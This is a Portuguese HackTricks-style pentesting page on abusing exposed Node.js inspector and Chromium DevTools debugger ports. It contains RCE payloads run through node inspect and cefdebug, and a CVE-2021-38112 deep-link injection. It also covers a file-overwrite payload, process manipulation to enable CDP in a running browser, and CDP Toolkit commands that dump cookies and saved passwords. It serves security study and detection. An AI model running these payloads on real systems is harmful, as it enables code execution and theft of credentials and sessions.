# Abuso do debugger do Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Exemplos práticos históricos incluem o walkthrough do Multimaster e o ataque ao debugger do Visual Studio Code CVE-2019-1414; use-os como contexto específico de versão, em vez de presumir que todo alvo atual de Electron ou Chromium exponha as mesmas primitivas.<sup>[[1]](#references)[[3]](#references)</sup>

## Informações básicas

[Da documentação](https://nodejs.org/learn/getting-started/debugging): quando iniciado com a opção `--inspect`, um processo Node.js aguarda uma conexão de um cliente de depuração. Por **padrão**, ele escuta no host e na porta **`127.0.0.1:9229`**. Cada processo também recebe um **UUID** **único**.<sup>[[4]](#references)</sup>

Os clientes do inspector precisam conhecer e especificar o endereço do host, a porta e o UUID para se conectar. Uma URL completa será semelhante a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Como o **debugger tem acesso total ao ambiente de execução do Node.js**, um agente malicioso capaz de se conectar a essa porta pode conseguir executar código arbitrário em nome do processo Node.js (**possível escalonamento de privilégios**).<sup>[[4]](#references)</sup>

Há várias maneiras de iniciar um inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Quando você inicia um processo sob inspeção, algo como isto aparecerá:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Processos baseados em **CEF** (**Chromium Embedded Framework**) podem expor um depurador com `--remote-debugging-port=9222`. Isso expõe o navegador por meio do [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), em vez de um inspetor do Node.js, portanto, payloads baseados em `process` do Node.js não se aplicam diretamente por padrão.<sup>[[2]](#references)[[5]](#references)</sup>

Ao iniciar um navegador com depuração habilitada, algo assim será exibido:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumerando e controlando um endpoint CDP

Os endpoints de descoberta HTTP distinguem o WebSocket do **browser** dos WebSockets de **target** individuais (aba, worker, extensão etc.). Consulte `/json/version` para obter o endpoint do browser e `/json/list` para os targets; os valores `webSocketDebuggerUrl` retornados podem então ser controlados diretamente com mensagens no formato JSON-RPC do CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Por exemplo, conecte-se com `websocat "$BROWSER_WS"` e envie `{"id":1,"method":"Target.getTargets"}` ou `{"id":2,"method":"Storage.getCookies"}`. Em um alvo de página (`websocat "$PAGE_WS"`), `Runtime.evaluate` é executado nesse renderer e `Page.captureScreenshot` retorna uma captura de tela codificada em base64. `document.cookie` não pode revelar cookies `HttpOnly`, enquanto `Storage.getCookies` consulta o armazenamento de cookies do navegador.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Navegadores, WebSockets e same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Os sites abertos em um navegador web podem fazer solicitações WebSocket e HTTP de acordo com o modelo de segurança do navegador. Uma **conexão HTTP inicial** é necessária para **obter um ID de sessão exclusivo do debugger**. A **same-origin-policy** **impede** que os sites façam **essa conexão HTTP**. Para aumentar a segurança contra [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** o Node.js verifica se os **cabeçalhos 'Host'** da conexão especificam um **endereço IP** ou exatamente **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> **Essas medidas de segurança impedem explorar o inspector** para executar código **apenas enviando uma solicitação HTTP** (o que poderia ser feito explorando uma vulnerabilidade SSRF).<sup>[[4]](#references)</sup>

### Iniciando o inspector em processos em execução

Você pode enviar o **sinal SIGUSR1** para um processo nodejs em execução para fazê-lo **iniciar o inspector** na porta padrão. No entanto, observe que você precisa ter privilégios suficientes. Portanto, isso pode conceder **acesso privilegiado a informações dentro do processo**, mas não uma privilege escalation direta.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Isso é útil em containers porque **encerrar o processo e iniciar um novo** com `--inspect` **não é uma opção**, pois o **container** será **encerrado** junto com o processo.<sup>[[6]](#references)</sup>

### Conectar ao inspector/debugger

Para conectar a um **navegador baseado em Chromium**, é possível acessar as URLs `chrome://inspect` ou `edge://inspect` para Chrome ou Edge, respectivamente. Ao clicar no botão Configure, deve-se garantir que o **host e a porta de destino** estejam listados corretamente. A imagem mostra um exemplo de Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Depois, será exibida uma URL para acessar o debugger, por exemplo, ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectar ao inspector/debugger: Para conectar a um navegador baseado em Chromium,...](<../../images/image (674).png>)

Usando a **linha de comando**, você pode se conectar a um debugger/inspector com:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

A ferramenta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspetores** em execução localmente e **injetar código** neles.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Observe que **exploits de RCE do NodeJS não funcionarão** se você estiver conectado a um navegador via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (é preciso verificar a API para encontrar coisas interessantes para fazer com ela).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE no Debugger/Inspector do NodeJS

> [!TIP]
> Se você chegou aqui procurando como obter [**RCE a partir de um XSS no Electron, consulte esta página.**](../../desktop-application-security/electron-desktop-apps/index.html)

Algumas formas comuns de obter **RCE** quando você consegue **se conectar** a um **inspector** do Node são usar algo como (parece que isso **não funcionará em uma conexão com o Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

Você pode consultar a API aqui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Nesta seção, vou apenas listar coisas interessantes que encontrei que as pessoas usaram para explorar esse protocolo.

### Restrição do perfil padrão no Chrome 136+

A partir do **Chrome 136**, o Chrome ignora `--remote-debugging-port` e `--remote-debugging-pipe` quando eles apontam para o **diretório de dados padrão do Chrome**. A opção precisa ser usada junto com um `--user-data-dir` não padrão, cuja chave de criptografia separada e estado isolado do navegador impedem que a técnica simples baseada em flags exponha o perfil autenticado normal do usuário. Não se deve presumir que essa restrição específica do Chrome se aplique a versões mais antigas do Chrome, ao Chrome for Testing, a aplicativos Electron/CEF ou a outras variantes do Chromium sem verificação.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Portanto, ver um processo atual do Chrome iniciado apenas com `--remote-debugging-port` **não** prova que o CDP foi ativado. Confirme o listener e `/json/version`, e determine qual perfil realmente o utiliza.<sup>[[14]](#references)</sup>

### Injeção de parâmetros via Deep Links

No [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), a Rhino Security descobriu que um aplicativo baseado em CEF **registrou um URI personalizado** no sistema (workspaces://index.html), que recebia o URI completo e então **iniciava o aplicativo baseado em CEF** com uma configuração parcialmente construída a partir desse URI.<sup>[[8]](#references)</sup>

Descobriu-se que os parâmetros do URI eram decodificados como URL e usados para iniciar o aplicativo baseado em CEF, permitindo que um usuário **injetasse** a flag **`--gpu-launcher`** na **linha de comando** e executasse comandos arbitrários.<sup>[[8]](#references)</sup>

Assim, um payload como:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Executará um calc.exe.<sup>[[8]](#references)</sup>

### Sobrescrever arquivos

Altere a pasta onde os **arquivos baixados serão salvos** e baixe um arquivo para **sobrescrever** o **código-fonte** da aplicação, frequentemente usado, com seu **código malicioso**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE e exfiltração via WebDriver

A STAR Labs mostrou que serviços WebDriver/CDP expostos podem permitir a leitura arbitrária de arquivos e RCE; em algumas configurações, DNS rebinding pode completar a cadeia de exploração.<sup>[[9]](#references)</sup>

O serviço WebDriver do ChromeDriver é distinto do Chrome DevTools/CDP. A capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) seleciona o executável do navegador iniciado para uma nova sessão. Se um usuário sem privilégios puder acessar um serviço ChromeDriver executado como root e enviar uma sessão com um caminho de executável controlado por ele, essa inicialização poderá atravessar o limite de privilégios do serviço. Uma resposta vazia de `/sessions` não determina se novas sessões podem ser criadas. Antes de concluir que esse caminho é viável, verifique o proprietário do processo, a acessibilidade real do listener, a autorização da sessão, o acesso ao executável e as medidas de isolamento; apenas o nome do processo ou a porta normalmente usada não são suficientes. [As diretrizes de segurança do Google](https://developer.chrome.com/docs/chromedriver/security-considerations) recomendam executar o ChromeDriver com uma conta sem privilégios. A enumeração passiva não deve criar uma sessão WebDriver.

Para outros casos históricos de automação de navegadores e segurança do Chromium, consulte o write-up do Counter WebDriver e os problemas 773, 1742 e 1944 do Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Habilitando CDP dentro de um processo Chromium em execução

A restrição de perfil padrão do Chrome bloqueia apenas o caminho de ativação pela linha de comando. Com acesso suficiente, sob o mesmo usuário, para manipular o processo do navegador, o [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) original e o [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) do Cobalt Strike invocam o método não exportado `content::DevToolsAgentHost::StartRemoteDebuggingServer` do Chromium dentro do `chrome.exe` ou `msedge.exe` já em execução. Assim, o endpoint pertence ao perfil real e mantém suas abas, extensões, cookies e estado autenticado.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Em processos x64 comuns do Chrome/Edge, o BOF localiza a janela do navegador e o `chrome.dll`/`msedge.dll` carregado, verifica o PE remoto em busca de assinaturas mascaradas, aloca stubs e um bloco de contexto, substitui temporariamente o procedimento da janela e despacha a chamada final na **thread de UI** do navegador. As entradas de execução relevantes são `StartRemoteDebuggingServer`, o `operator new` do Chromium, `TCPServerSocketFactory::CreateForHttpServer` e a vtable da factory. A execução é interrompida se qualquer assinatura obrigatória não tiver uma correspondência única.<sup>[[15]](#references)[[16]](#references)</sup>

O BOF aceita um modo de navegador e uma porta opcional. Em seguida, seu script auxiliar pode verificar o endpoint e coletar cookies; `chrome-iso` é um caminho separado para o limite de Isolamento de Processos do Chrome no Windows.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

O caminho `chrome-iso` usa apenas handles limitados a consultas para o processo isolado. Ele identifica o `chrome.dll` instalado cujo tamanho da imagem PE corresponde ao do processo em execução, resolve símbolos dessa imagem local e usa o dispatch de `WindowImpl` do Chromium, além de `WM_COPYDATA` síncrono e um hook User32 em uma imagem existente, para alcançar a thread da UI.<sup>[[16]](#references)</sup>

> [!WARNING]
> Esta é uma técnica de **manipulação do processo do navegador após o comprometimento**, não um bypass de rede não autenticado. Ela depende da build, pois os símbolos C++ relevantes não são exportados e podem mudar após atualizações do navegador.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Atualizar assinaturas após atualizações do navegador

Use a versão exata de `chrome.dll` ou `msedge.dll` instalada no alvo e seu PDB correspondente. O `symchk.exe` do Windows SDK baixa os símbolos; em seguida, os scripts do repositório localizam `StartRemoteDebuggingServer`, derivam as entradas do allocator/socket-factory ou validam todas as assinaturas incorporadas no BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Um resultado sem correspondências ou com várias correspondências não deve ser substituído por um endereço arbitrário. Se um padrão conhecido de `operator new` ou `CreateForHttpServer` tiver mudado demais para servir de base a uma nova máscara, use `pe_signature_finder.py` com o PDB para inspecionar esse símbolo e derivar uma sequência de bytes exclusiva no módulo de destino.<sup>[[16]](#references)[[18]](#references)</sup>

#### Extração por navegador autenticado com CDP Toolkit

Esta técnica não descriptografa o App-Bound Encryption (ABE) offline nem remove a vinculação ao dispositivo. Em vez disso, ela trata o navegador legítimo como um **oráculo de descriptografia e proxy de interação autenticada**: `Storage.getCookies` solicita os cookies ao vivo ao armazenamento do navegador, enquanto os fluxos de navegação e captura de tela mantêm as solicitações, o armazenamento, a autenticação corporativa e o comportamento vinculado ao dispositivo dentro do navegador existente da vítima.<sup>[[17]](#references)[[18]](#references)</sup>

Após encaminhar o listener CDP de loopback pelo pivot do operador, o [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) pode enumerar e coletar artefatos comuns.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` e `tabs screenshot` são, em sua maioria, wrappers para `/json/version`, a lista de alvos, `Storage.getCookies` e `Page.captureScreenshot`. Já o histórico, os favoritos, as extensões e os metadados de senhas exigem um alvo temporário de WebUI `chrome://`/`edge://`: o toolkit aguarda a renderização da interface, inspeciona seu modelo ou DOM, coleta o resultado e fecha o alvo.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` vai além: abre a origem real do login salvo, foca um campo de credencial, seleciona a sugestão nativa de preenchimento automático usando eventos de entrada do CDP e lê os valores preenchidos. A origem/porta/caminho deve corresponder de perto ao realm da senha salva; o modo visível é a opção padrão confiável, pois o pop-up de sugestão é uma interface nativa do navegador.<sup>[[17]](#references)[[18]](#references)</sup>

Para interação ao vivo, `browser-takeover screencast` transmite quadros e envia entradas para um alvo real (inclusive em modos em segundo plano ou fora da tela). Já `browser-takeover proxy` aceita localmente HTTP e HTTPS `CONNECT` e faz solicitações upstream por meio de alvos ocultos do Chrome, usando abas em segundo plano quando os alvos ocultos não estão disponíveis; isso preserva o contexto de rede/autenticação da vítima, mas é menos fiel para aplicações complexas do lado do cliente, pois o navegador do operador renderiza o conteúdo retornado.<sup>[[17]](#references)[[18]](#references)</sup>

Para detecção, não dependa apenas da telemetria de linha de comando `--remote-debugging-*`: correlacione também handles incomuns e operações de memória direcionadas aos processos do navegador (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, criação de threads), injeção de DLL e sockets de escuta inesperados no loopback pertencentes ao Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Em um ambiente real e **após comprometer** um PC de usuário que utiliza um navegador baseado em Chromium, uma técnica histórica consistia em reiniciar o navegador com o debugging habilitado e encaminhar a porta de loopback. Isso pode expor o estado de navegação da vítima em produtos/versões que ainda aceitam o perfil selecionado, mas o Chrome 136+ não permitirá isso com seu diretório de dados padrão.<sup>[[7]](#references)[[14]](#references)</sup>

O comando original de reinicialização é mantido abaixo para alvos antigos/específicos de versão. O segundo comando é a forma compatível com o Chrome atual, mas cria um perfil isolado em vez de reabrir o estado autenticado normal da vítima.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Para técnicas de relançamento, extensão e CDP específicas do macOS no Chromium, consulte [Injeção no Chromium do macOS](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Ferramenta de inspeção e exploração do debugger do CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Execução remota de código no Visual Studio Code via debugger do Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guia de debugging do Node.js - Primeiros passos](https://nodejs.org/learn/getting-started/debugging)
- [5] [Protocolo do Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup do corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Pós-exploração: abusando do recurso de debugging do Chrome para observar e controlar sessões de navegação remotamente](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Execução remota de código no AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Você está falando comigo? - RCE no WebDriver via DNS rebinding e CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Contra o WebDriver - De bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Issue 773 do Google Project Zero (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Issue 1742 do Google Project Zero (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Issue 1944 do Google Project Zero (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Alterações nas opções de debugging remoto para melhorar a segurança - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injetando CDP em um navegador Edge em execução: uma análise aprofundada da instrumentação do navegador em tempo de execução](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - O retorno do Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
